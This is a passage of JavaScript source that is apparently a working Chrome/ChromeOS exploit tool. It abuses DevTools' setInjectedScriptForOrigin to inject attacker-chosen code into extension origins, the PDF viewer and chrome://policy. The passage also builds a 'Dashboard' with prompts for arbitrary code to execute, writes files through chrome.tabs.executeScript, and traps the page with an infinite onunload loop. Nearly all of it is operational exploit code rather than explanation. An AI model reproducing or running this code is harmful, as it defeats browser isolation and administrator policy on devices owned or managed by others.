ke3BhcnNlSW50KGV2ZW50LmtleSl9KWApLmNsaWNrKCk7CiAgICAgICAgfQogICAgICB9KTsKICAgIDwvc2NyaXB0PgogIDwvYm9keT4KPC9odG1sPg==`));
            document.querySelector('#activate').onclick = function () {
                dbgext(false, pdfId);
            }
            onunload = function () {
                while (true);
            }
            document.close();
            document.title = "Dashboard";
            document.querySelector('#activate2').onclick = function (ev) {

                function xd(w) {
                    w.close();
                    const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                    const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                    chrome.tabs.getCurrent(function (tab) {
                        console.log(tab);
                        chrome.windows.create({ url: mojoURL, setSelfAsOpener: true }, function (info) {
                            async function createAndWriteFile() {
                                function writeFile(filename, content) {
                                    return new Promise((resolve) => {
                                        webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, function (fs) {
                                            fs.root.getFile(filename, { create: true }, function (entry) {
                                                entry.remove(function () {
                                                    fs.root.getFile(filename, { create: true }, function (entry) {
                                                        entry.createWriter(function (writer) {
                                                            writer.write(new Blob([content]))
                                                            writer.onwriteend = function () {
                                                                resolve(entry.toURL());
                                                            }
                                                        })
                                                    })
                                                })
                                            })
                                        })
                                    })

                                }
                                const htmlFile = `<html>
                                <head></head><body><iframe src="filesystem:chrome://extensions/temporary/nothing.html"></iframe>
                                </html>
                                <script>
                                onerror=  alert;
                                if (top !== window) {
                                    top.location.replace(location.href);
                                };
                                </script>
                                `
                                
                                // alert(url);
                                opener.postMessage({ url: (await writeFile('index.html', htmlFile))}, '*');
                                setTimeout(function () {
                                    close();
                                }, 800);
                            }
                            chrome.tabs.executeScript(info.tabs[0].id, { code: `(${createAndWriteFile.toString()})()` });
                            function m2(url) {
                                // alert(url);
                                onmessage = function (data) {
                                    if (data.data.type === "ack") {
                                        
                                        // chrome.tabs.getCurrent(function (tab) {
                                            // alert("navigating");
                                            top.location.replace("")
                                        // })
                                    }
                                }
                                top.postMessage({ type: 'acc' }, '*');
                            }
                            onmessage = function (dat) {
                                if (dat.data.url) {
                                    m2(dat.data.url);
                                }
                            };
                        })
                    })

                }
                dbgext(false, pdfId, xd.toString());
            }
            onmessage = function (ev) {
                if (ev.data.type === "browserInitNavigate") {
                    alert(1);
                    ev.source.location.replace(ev.data.url);
                }
            }
            document.querySelector('#updater').onclick = function (ev) {
                onunload = null;
                const ws = new WebSocket("ws://%%updaterurl%%");

                ws.onopen = function () {
                    ws.onmessage = function (ev) {
                        const received = JSON.parse(ev.data);
                        const savedURL = received.params.request.url;
                        ws.close();
                        const w = open('', '_blank');
                        console.log(savedURL);
                        w.eval(`setTimeout(function () {opener.open(atob("${btoa(savedURL)}"), '_blank'); window.close()}, 500);`);
                        setTimeout(() => { location.reload() });
                    }
                    ws.send(JSON.stringify({
                        method: "Target.setDiscoverTargets",
                        id: 999,
                        params: {}
                    }));
                }

            }
            onmessage = function (d) {
                if (d.data.type === "acc") {
                    onunload = function () { while (true); };
                    d.source.postMessage({ type: "ack" }, '*');
                    
                };

                if (!globalMap[d.data.uid]) return;

                for (const frame of globalMap) {
                    if (!frame) continue;
                    if (frame.idx === d.data.uid) {
                        frame.remove();
                        delete globalMap[globalMap.indexOf(frame)];
                        return;
                    }
                }
            }
            function dbgext(cleanup, id, payload) {
                let x = id;
                while (!x) {
                    x = prompt('Extension id?');
                    if (x === "cancel") {
                        return;
                    }
                }
                let path = '//manifest.json';
                let is_pdf = false;
                let injected = payload ?? payload_swamp.toString();
                if (x === pdfId) {
                    path = "index.html"; // pdf viewer hack
                    is_pdf = true;
                    const b = prompt("code to execute!");
                    if (!b) return;
                    injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));
                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b+'//');
                    
                }
                const URL_1 = `chrome-extension://${x ??
                    alert("NOTREACHED")}/${path}`;
                InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);
                const ifr = document.createElement("iframe");
                ifr.src = URL_1;
                document.body.appendChild(ifr);
                const ifrid = globalMap.push(ifr) - 1;
                ifr.idx = ifrid;
                ifr.onload = function () {

                    ifr.contentWindow.postMessage({
                        type: "uidpass", passcode:
                            ifrid,
                        cleanup: cleanup
                    }, '*');
                    // console.log('hi');
                }
                // alert(1);

            }
            document.querySelector('#extdbg').onclick = function () {
                dbgext(false);
            }
            document.querySelectorAll('.hardcoded').forEach(el => {el.onclick = function () {
                let extid = el.getAttribute("ext");
                console.log(el.innerText, extid);
                dbgext(false, extid);
                }
            });
            document.querySelector('#cleanup').onclick = function () {
                dbgext(true);
            }
            document.querySelector('#devdbg').onclick = function () {
                var l_canceled = false;
                const id = setTimeout(function m() {
                    if (l_canceled) return;
                    (new Function(prompt("Evaluate script! (type 'cancel' to cancel)")))();
                    if (!l_canceled) setTimeout(m, 0);
                    clearTimeout(id);
                });
                Object.defineProperty(window, 'cancel', {
                    get: function () {
                        l_canceled = true;
                    }, configurable: true
                })
                return;
            }
            console.log(globalMap);
        }
        w.eval(`(${ui.toString()})()`);
        window.close();

    }

    function sleep(ms) {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }
})
)()
